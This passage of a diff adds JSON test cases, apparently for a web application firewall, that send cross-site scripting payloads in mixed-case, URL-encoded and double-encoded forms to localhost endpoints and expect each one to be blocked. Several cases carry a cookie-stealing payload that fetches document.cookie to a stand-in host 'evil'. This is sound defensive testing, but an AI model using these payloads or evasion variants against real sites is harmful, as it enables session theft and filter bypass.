+    "class": "xss",
+    "name": "XSS query:name [mixed-case]",
+    "description": "Cross-site scripting via query:name: '-alert(1)-'",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name='-aLeRt(1)-'",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0034",
+    "class": "xss",
+    "name": "XSS body:comment [mixed-case]",
+    "description": "Cross-site scripting via body:comment: '-alert(1)-'",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"'-alert(1)-'\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0035",
+    "class": "xss",
+    "name": "XSS body:display_name [mixed-case]",
+    "description": "Cross-site scripting via body:display_name: '-alert(1)-'",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"'-alert(1)-'\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0036",
+    "class": "xss",
+    "name": "XSS body:preferences [mixed-case]",
+    "description": "Cross-site scripting via body:preferences: '-alert(1)-'",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"'-alert(1)-'\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0037",
+    "class": "xss",
+    "name": "XSS query:name [urlencode]",
+    "description": "Cross-site scripting via query:name: </script><script>alert(1)</script>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0038",
+    "class": "xss",
+    "name": "XSS body:comment [raw]",
+    "description": "Cross-site scripting via body:comment: </script><script>alert(1)</script>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"</script><script>alert(1)</script>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0039",
+    "class": "xss",
+    "name": "XSS body:display_name [double-urlencode]",
+    "description": "Cross-site scripting via body:display_name: </script><script>alert(1)</script>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"</script><script>alert(1)</script>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0040",
+    "class": "xss",
+    "name": "XSS body:preferences [urlencode]",
+    "description": "Cross-site scripting via body:preferences: </script><script>alert(1)</script>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"</script><script>alert(1)</script>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0041",
+    "class": "xss",
+    "name": "XSS query:name [raw]",
+    "description": "Cross-site scripting via query:name: <img src=x onerror=fetch('//evil/'+docum",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=<img src=x onerror=fetch('//evil/'+document.cookie)>",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0042",
+    "class": "xss",
+    "name": "XSS body:comment [double-urlencode]",
+    "description": "Cross-site scripting via body:comment: <img src=x onerror=fetch('//evil/'+docum",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<img src=x onerror=fetch('//evil/'+document.cookie)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0043",
+    "class": "xss",
+    "name": "XSS body:display_name [double-urlencode]",
+    "description": "Cross-site scripting via body:display_name: <img src=x onerror=fetch('//evil/'+docum",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<img src=x onerror=fetch('//evil/'+document.cookie)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0044",
+    "class": "xss",
+    "name": "XSS body:preferences [raw]",
+    "description": "Cross-site scripting via body:preferences: <img src=x onerror=fetch('//evil/'+docum",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<img src=x onerror=fetch('//evil/'+document.cookie)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0045",
+    "class": "xss",
+    "name": "XSS query:name [mixed-case]",
+    "description": "Cross-site scripting via query:name: <details open ontoggle=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=<DeTaIlS OpEn oNtOgGlE=AlErT(1)>",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0046",
+    "class": "xss",
+    "name": "XSS body:comment [double-urlencode]",
+    "description": "Cross-site scripting via body:comment: <details open ontoggle=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<details open ontoggle=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0047",
+    "class": "xss",
+    "name": "XSS body:display_name [raw]",
+    "description": "Cross-site scripting via body:display_name: <details open ontoggle=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<details open ontoggle=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0048",
+    "class": "xss",
+    "name": "XSS body:preferences [mixed-case]",
+    "description": "Cross-site scripting via body:preferences: <details open ontoggle=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<details open ontoggle=alert(1)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0049",
+    "class": "xss",
+    "name": "XSS query:name [raw]",
+    "description": "Cross-site scripting via query:name: <svg><animate onbegin=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=<svg><animate onbegin=alert(1)>",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0050",
+    "class": "xss",
+    "name": "XSS body:comment [mixed-case]",
+    "description": "Cross-site scripting via body:comment: <svg><animate onbegin=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<svg><animate onbegin=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0051",
+    "class": "xss",
+    "name": "XSS body:display_name [raw]",
+    "description": "Cross-site scripting via body:display_name: <svg><animate onbegin=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<svg><animate onbegin=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0052",
+    "class": "xss",
+    "name": "XSS body:preferences [urlencode]",
+    "description": "Cross-site scripting via body:preferences: <svg><animate onbegin=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<svg><animate onbegin=alert(1)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0053",
+    "class": "xss",
+    "name": "XSS query:name [mixed-case]",
+    "description": "Cross-site scripting via query:name: <marquee onstart=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=<MaRqUeE OnStArT=AlErT(1)>",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0054",
+    "class": "xss",
+    "name": "XSS body:comment [raw]",
+    "description": "Cross-site scripting via body:comment: <marquee onstart=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:raw",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<marquee onstart=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0055",
+    "class": "xss",
+    "name": "XSS body:display_name [urlencode]",
+    "description": "Cross-site scripting via body:display_name: <marquee onstart=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<marquee onstart=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0056",
+    "class": "xss",
+    "name": "XSS body:preferences [double-urlencode]",
+    "description": "Cross-site scripting via body:preferences: <marquee onstart=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<marquee onstart=alert(1)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0057",
+    "class": "xss",
+    "name": "XSS query:name [urlencode]",
+    "description": "Cross-site scripting via query:name: <input autofocus onfocus=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=%3Cinput%20autofocus%20onfocus%3Dalert%281%29%3E",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0058",
+    "class": "xss",
+    "name": "XSS body:comment [mixed-case]",
+    "description": "Cross-site scripting via body:comment: <input autofocus onfocus=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<input autofocus onfocus=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0059",
+    "class": "xss",
+    "name": "XSS body:display_name [mixed-case]",
+    "description": "Cross-site scripting via body:display_name: <input autofocus onfocus=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<input autofocus onfocus=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0060",
+    "class": "xss",
+    "name": "XSS body:preferences [mixed-case]",
+    "description": "Cross-site scripting via body:preferences: <input autofocus onfocus=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<input autofocus onfocus=alert(1)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0061",
+    "class": "xss",
+    "name": "XSS query:name [mixed-case]",
+    "description": "Cross-site scripting via query:name: <video><source onerror=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "GET",
+      "path": "/game/1?name=<ViDeO><sOuRcE OnErRoR=AlErT(1)>",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/"
+      },
+      "body": null,
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0062",
+    "class": "xss",
+    "name": "XSS body:comment [urlencode]",
+    "description": "Cross-site scripting via body:comment: <video><source onerror=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/feedback",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"comment\": \"<video><source onerror=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0063",
+    "class": "xss",
+    "name": "XSS body:display_name [double-urlencode]",
+    "description": "Cross-site scripting via body:display_name: <video><source onerror=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:double-urlencode",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/api/profile",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"display_name\": \"<video><source onerror=alert(1)>\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
+    }
+  },
+  {
+    "id": "xss-0064",
+    "class": "xss",
+    "name": "XSS body:preferences [mixed-case]",
+    "description": "Cross-site scripting via body:preferences: <video><source onerror=alert(1)>",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "evasion:mixed-case",
+      "owasp:A03"
+    ],
+    "request": {
+      "method": "PUT",
+      "path": "/user/settings",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"preferences\": {\"notifications\": \"<video><source onerror=alert(1)>\"}}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "xss"
+      ]
